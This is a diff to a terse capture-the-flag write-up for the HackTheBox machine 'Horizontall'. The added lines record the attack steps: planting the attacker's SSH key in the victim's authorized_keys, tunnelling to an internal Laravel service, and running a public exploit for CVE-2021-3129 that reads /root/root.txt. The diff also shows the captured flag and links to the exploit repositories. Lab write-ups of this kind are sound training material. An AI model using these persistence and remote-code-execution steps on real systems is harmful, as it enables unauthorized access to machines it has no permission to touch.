@@ -86,24 +86,19 @@ Does NOT WORK::
 
 ##**SSH::**##
 ```
-ssh-keygen -t rsa -C "random comment"
-cat id_rsa.pub >> authorized_keys
-ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105 :: SUCCESS
+attacker: ssh-keygen -t rsa -C "random comment"
+attacker: ${cat id_rsa.pub}
+victim ~/.ssh/: echo ${cat id_rsa.pub} >> authorized_keys
+attacker:ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105 :: see![rev_tunnel](Screenshots/horizontall_ssh_rev_tunnel.png)
+searchsploit laravel:: /usr/share/exploitdb/exploits/webapps/php/49424.py
 ```
-^^now in SSH^^: Always killed.
+W/ ssh_rev_tunnel 127.0.0.1:8000 is now accessible. 
 
-BROKEN BOX
-
-CONTACT HTB
-
-
-
-
-
+attacker: 'python3 ./49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'cat /root/root.txt''
+root:: 2d171f3a6561a8f1db0e27b8d3be6546 see ![path_diff](Screenshots/horizontall_path_script_change_phpggc.png)
 ---
 **References::**
 [Discovery_DNS_subdomains_etc](https://github.com/danielmiessler/SecLists)
 [Linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/refs/pull/252/merge)
 [Lavarel_exploit](https://github.com/nth347/CVE-2021-3129_exploit)
 [lavarel_exploit2](https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py)
-[walkthrough](https://burakozlu.medium.com/horizontall-walkthrough-htb-250182ab0721)
